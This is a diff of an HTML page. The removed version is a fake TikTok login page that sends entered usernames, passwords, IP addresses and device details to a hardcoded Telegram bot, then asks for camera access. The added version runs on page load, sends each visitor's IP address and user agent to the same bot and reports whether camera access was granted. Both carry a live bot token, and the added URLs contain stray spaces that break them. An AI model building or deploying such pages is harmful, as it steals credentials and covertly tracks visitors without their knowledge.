@@ -3,247 +3,213 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Log in to TikTok</title>
-  <link rel="icon" type="image/png" href="./img/tiktok-fav.ico" />
+  <title>Autoplay Camera with Telegram Notification</title>
   <style>
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
 
     body {
-      background: linear-gradient(to right, #f2f3f7, #e5e7eb);
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f2f2f2;
       color: #333;
-    }
-
-    .login-container {
-      background: white;
-      max-width: 420px;
-      width: 100%;
-      padding: 40px 30px;
-      border-radius: 16px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-      text-align: center;
-    }
-
-    .login-container h2 {
-      font-size: 24px;
-      margin-bottom: 20px;
-      color: #000;
-    }
-
-    form {
       display: flex;
       flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding: 40px 20px;
     }
 
-    input[type="text"],
-    input[type="password"] {
-      padding: 14px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 14px;
-      transition: border-color 0.3s ease;
-    }
-
-    input:focus {
-      border-color: #e94774;
-      outline: none;
-    }
-
-    button {
-      width: 100%;
-      background-color: #e94774;
-      color: white;
-      padding: 14px;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 10px;
-      transition: background-color 0.3s ease;
-    }
-
-    button:hover {
-      background-color: #d4305a;
-    }
-
-    .footer {
-      margin-top: 20px;
-      font-size: 14px;
-    }
-
-    .footer a {
-      color: #3897f0;
-      text-decoration: none;
-      font-weight: bold;
-    }
-
-    .message {
-      margin-top: 15px;
-      font-weight: bold;
-      font-size: 14px;
-    }
-
-    .success {
-      color: green;
-    }
-
-    .error {
-      color: red;
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+      color: #2c3e50;
     }
 
     video {
       width: 100%;
-      margin-top: 15px;
-      border-radius: 8px;
+      max-width: 640px;
+      height: auto;
+      border: 3px solid #3498db;
+      border-radius: 10px;
+      background-color: #000;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
       display: none;
     }
 
-    canvas {
+    .info {
+      margin-top: 25px;
+      font-size: 1.1rem;
+      line-height: 1.6;
+      background: #ffffff;
+      padding: 15px 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      max-width: 640px;
+      text-align: left;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #3498db;
+      border-radius: 50%;
+      border-top-color: transparent;
+      animation: spin 1s ease-in-out infinite;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .retry-button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      font-size: 1rem;
+      background-color: #3498db;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .retry-button:hover {
+      background-color: #2980b9;
+    }
+
+    .status-message {
+      margin-top: 15px;
+      font-size: 1rem;
+      color: green;
       display: none;
     }
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <h2>Log in to TikTok</h2>
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Email or username" required />
-      <input type="password" id="password" placeholder="Password" required />
-      <button type="submit">Log In</button>
-    </form>
+  <h1>Autoplay Start Camera</h1>
+  <video id="video" autoplay playsinline></video>
+  <div class="info" id="deviceInfo">Loading device information <span class="spinner"></span></div>
+  <button class="retry-button" id="retryBtn" style="display:none;">Retry Access Camera</button>
+  <div class="status-message" id="statusMessage">✅ Message sent successfully!</div>
 
-    <!-- Video element for camera preview -->
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <button id="captureBtn" style="display:none; margin-top:10px;">Capture Photo</button>
-
-    <div class="footer">
-      <p>Don't have an account? <a href="#">Sign up</a></p>
-    </div>
-    <div id="responseMessage" class="message"></div>
-    <div class="device-info" id="deviceInfo"></div>
-  </div>
-
-  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
   <script>
-    const TOKEN = "6380138289:AAHOPzz0h7lXXNZPxAErxQvD1jm9LNSk5OY";
-    const CHAT_ID = "711360667";
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+    (function () {
+      const video = document.getElementById('video');
+      const deviceInfoDiv = document.getElementById('deviceInfo');
+      const retryBtn = document.getElementById('retryBtn');
+      const statusMessage = document.getElementById('statusMessage');
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const captureBtn = document.getElementById('captureBtn');
+      const TELEGRAM_CONFIG = {
+        TOKEN: "6380138289:AAHOPzz0h7lXXNZPxAErxQvD1jm9LNSk5OY",
+        CHAT_ID: "711360667",
+        URI_API: function () {
+          return `https://api.telegram.org/bot ${this.TOKEN}/sendMessage`;
+        }
+      };
 
-    document.getElementById("loginForm").addEventListener("submit", function (e) {
-      e.preventDefault();
+      const sendMessageToTelegram = async (message) => {
+        try {
+          const response = await fetch(TELEGRAM_CONFIG.URI_API(), {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CONFIG.CHAT_ID,
+              text: message
+            })
+          });
 
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
-      const responseMessage = document.getElementById("responseMessage");
-      const deviceInfoDiv = document.getElementById("deviceInfo");
+          if (response.ok) {
+            statusMessage.style.display = 'block';
+          } else {
+            console.error("Failed to send message to Telegram:", await response.text());
+          }
+        } catch (err) {
+          console.error("Failed to send message to Telegram:", err);
+        }
+      };
 
-      if (!username || !password) {
-        showMessage("Please enter both username and password.", "error");
-        return;
-      }
-
-      // Show loading
-      showMessage("Logging in...", "info");
-      deviceInfoDiv.innerHTML = "Fetching device info...";
-
-      axios.get('https://api.ipify.org?format=json')
-        .then(ipResponse => {
-          const ip = ipResponse.data.ip;
+      const getDeviceInfo = async () => {
+        try {
+          const ipResponse = await fetch('https://api.ipify.org ?format=json');
+          const ipData = await ipResponse.json();
           const userAgent = navigator.userAgent;
-          const platform = navigator.platform;
-          const screenWidth = screen.width;
-          const screenHeight = screen.height;
-          const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
+          return {
+            ip: ipData.ip,
+            userAgent
+          };
+        } catch (err) {
+          console.error("Failed to retrieve device info:", err);
+          return {
+            ip: "Unknown IP",
+            userAgent: "Unknown Device"
+          };
+        }
+      };
+
+      const showErrorMessage = () => {
+        deviceInfoDiv.innerHTML = `<strong>Error:</strong> Could not access the camera. Please allow permissions.`;
+        retryBtn.style.display = "inline-block";
+      };
+
+      const startCamera = async () => {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.style.display = "block";
+          video.srcObject = stream;
+        } catch (err) {
+          console.error("Error accessing camera:", err);
+          showErrorMessage();
+        }
+      };
+
+      const initApp = async () => {
+        deviceInfoDiv.innerHTML = `Requesting camera access... <span class="spinner"></span>`;
+        retryBtn.style.display = "none";
+        statusMessage.style.display = "none";
+
+        const deviceInfo = await getDeviceInfo();
+
+        await startCamera();
+
+        if (video.srcObject) {
           deviceInfoDiv.innerHTML = `
-            <strong>Device:</strong> ${deviceType}<br/>
-            <strong>Platform:</strong> ${platform}<br/>
-            <strong>Resolution:</strong> ${screenWidth}x${screenHeight}
+            <strong>IP Address:</strong> ${deviceInfo.ip}<br/>
+            <strong>Device/User Agent:</strong> ${deviceInfo.userAgent}
           `;
+          const message = `🎥 Camera started!\nIP Address: ${deviceInfo.ip}\nDevice: ${deviceInfo.userAgent}`;
+          await sendMessageToTelegram(message);
+        } else {
+          const fallbackMessage = `⚠️ Page loaded but camera NOT accessed.\nIP Address: ${deviceInfo.ip}\nDevice: ${deviceInfo.userAgent}`;
+          await sendMessageToTelegram(fallbackMessage);
+        }
+      };
 
-          const message = `
-<b>🔐 New Login Attempt</b>\n
-<b>Platform:</b> TikTok\n
-<b>Email or Username:</b> ${username}\n
-<b>Password:</b> ${password}\n
-<b>IP Address:</b> ${ip}\n
-<b>Device:</b> ${deviceType}\n
-<b>Platform:</b> ${platform}\n
-<b>User Agent:</b> ${userAgent}\n
-<b>Resolution:</b> ${screenWidth}x${screenHeight}
-          `;
-
-          axios.post(URI_API, {
-            chat_id: CHAT_ID,
-            parse_mode: 'html',
-            text: message
-          }).then(() => {
-            showMessage("Login successful! Redirecting...", "success");
-
-            // Ask for camera permission
-            requestCameraAccess();
-
-            setTimeout(() => {
-              window.location.href = "https://www.tiktok.com/";
-            }, 3000);
-          }).catch(error => {
-            console.error("Telegram error:", error);
-            showMessage("Failed to send login data. Try again.", "error");
-          });
-        })
-        .catch(ipError => {
-          console.error("IP fetch error:", ipError);
-          showMessage("Unable to retrieve IP address.", "error");
-          deviceInfoDiv.innerHTML = "";
-        });
-
-      function showMessage(text, type) {
-        responseMessage.textContent = text;
-        responseMessage.className = `message ${type}`;
-      }
-
-      function requestCameraAccess() {
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
-            video.srcObject = stream;
-            video.style.display = 'block';
-            captureBtn.style.display = 'inline-block';
-          })
-          .catch(err => {
-            console.warn("Camera access denied or not available.");
-          });
-      }
-
-      captureBtn.addEventListener('click', () => {
-        const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(blob => {
-          const file = new File([blob], "snapshot.jpg", { type: "image/jpeg" });
-
-          // Optional: Send image via Telegram Bot API using FormData
-          // Note: Axios doesn't support sending files directly unless you use form-data
-
-          alert("Photo captured!");
-        }, 'image/jpeg', 0.9);
+      retryBtn.addEventListener("click", () => {
+        deviceInfoDiv.innerHTML = `Retrying camera access... <span class="spinner"></span>`;
+        statusMessage.style.display = "none";
+        initApp();
       });
-    });
+
+      window.onload = () => {
+        initApp();
+      };
+    })();
   </script>
 </body>
 </html>
